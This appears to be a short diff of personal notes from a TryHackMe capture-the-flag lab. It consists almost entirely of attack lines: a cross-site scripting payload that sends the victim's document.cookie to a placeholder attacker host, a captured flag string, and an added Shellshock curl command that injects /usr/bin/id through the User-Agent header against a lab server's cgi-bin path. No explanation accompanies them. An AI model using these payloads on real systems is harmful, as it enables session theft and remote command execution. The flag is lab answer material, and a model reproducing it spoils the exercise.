@@ -1,2 +1,3 @@
 <script>fetch('http://ТВОЙ_IP_VPN:8000/?c=' + document.cookie)</script>
 THM{1_c4n_r3ad_4ll_l3tters_w1th_th1s_1d0r}
+curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://10.80.164.227:3000/cgi-bin/cgi-bin/cgi-bin/cgi-bin/3WpzTMYEK9QG0eqIBQxrR
